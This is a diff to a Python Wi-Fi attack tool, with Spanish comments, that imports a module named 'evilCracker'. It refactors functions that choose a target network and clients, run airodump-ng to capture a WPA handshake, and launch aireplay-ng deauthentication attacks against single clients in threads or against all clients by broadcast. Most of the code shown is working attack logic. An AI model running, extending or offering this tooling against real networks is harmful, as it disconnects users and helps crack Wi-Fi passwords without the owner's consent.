@@ -1,5 +1,6 @@
 #!/bin/python3
 # SUBIR A PYPI
+import concurrent.futures
 
 try:
     # Importamos librerias
@@ -15,6 +16,7 @@ try:
     import subprocess
     import threading
     import multiprocessing
+    from concurrent.futures import ThreadPoolExecutor
     import os
     import argparse
     import evilCracker
@@ -546,7 +548,7 @@ def select_network(net_specs, net_clients, args):
 
 def prepare_attack(net_specs, net_clients, network_to_attack, args):
     file = None
-
+    clients = {}
     while not file:
         file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + 
                      Fore.LIGHTCYAN_EX + "Enter the name of the file to save [E.j capture1] > ")
@@ -567,12 +569,10 @@ def prepare_attack(net_specs, net_clients, network_to_attack, args):
         try:
             clients = net_clients['networks'][num_net][bssid]
         except KeyError:
-            clients = None
             continue
 
     if clients:
         attack_client = print_clients(net_clients, bssid)
-
     else:
         attack_client = None
 
@@ -638,6 +638,8 @@ def select_client(clients):
             clients_to_do_attack = verify_clients(num_client, clients, clients_to_attack)
             if clients_to_do_attack != 0:
                 break
+            else:
+                clients_to_do_attack = None
 
     # Devolvemos cliente a atacar
     return clients_to_do_attack
@@ -672,20 +674,25 @@ def capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_cl
                              + file, "-c", ch, "--bssid", bssid,
                              f"{interface}"], stdout=subprocess.PIPE)
 
+    threads = []
     # Si tenemos cliente  para atacar:
-    if attack_client is not None:
-        threads = []
-        for client in attack_client:
-            thread = threading.Thread(target=deauth_client, args=(bssid, client))
+    if attack_client is not None:   # 1 solo client
+        if len(attack_client) == 1:
+            time.sleep(0.2)
+            thread = threading.Thread(target=deauth_client, args=(bssid, attack_client[0]))
             thread.start()
             threads.append(thread)
 
-        # Esperar a que todos los hilos terminen
-        for thread in threads:
-            thread.join()
-            
+        elif len(attack_client) > 1:   # Mas de 1 clients
+            for client in attack_client:
+                time.sleep(0.2)
+                thread = threading.Thread(target=deauth_client, args=(bssid, client))
+
+                thread.start()
+                threads.append(thread)
+
     # Si no al broadcast
-    else:
+    elif attack_client is None:
         subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface],
                          stdout=subprocess.DEVNULL)
 
@@ -695,6 +702,7 @@ def capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_cl
             output = hand.stdout.readline()
             print(output.decode().strip())
             if "WPA handshake:".encode() in output:
+                time.sleep(0.2)
                 # Dejamos que se envien correctamente todos los paquetes
                 done = True
                 # Rompemos búcle
@@ -702,6 +710,11 @@ def capture_handshake(direc, args, bssid, ch, file, network_to_attack, attack_cl
 
         except KeyboardInterrupt:
             break
+
+    # Esperar a que todos los hilos terminen
+    if threads:
+        for thread in threads:
+            thread.join() 
 
     print(Fore.LIGHTCYAN_EX + "\n\n\n\n\n\n\n\n\n\n\n\n[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
     if done:
